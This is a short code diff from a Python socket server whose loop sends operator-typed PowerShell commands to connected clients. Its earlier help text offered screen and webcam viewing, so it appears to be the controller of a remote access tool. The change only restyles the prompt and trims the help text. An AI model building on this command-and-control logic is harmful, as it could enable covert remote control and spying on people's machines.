@@ -72,12 +72,12 @@ def start_server():
 
             while True:
                 try:
-                    command = input(f"@Server/{data_client[int(con[1])][2]}>")
+                    command = input(f"{colorama.Fore.RED}@Client/{data_client[int(con[1])][2]}>{colorama.Fore.LIGHTBLUE_EX}")
 
                     if command == "exit":
                         break
                     elif command == "help":
-                        print("u can use powershell commands or\n*viewscreen\n*viewcam")
+                        print("u can use powershell commands")
                         continue
 
                     data_client[int(con[1])][0].send(bytes(command, "utf-8"))
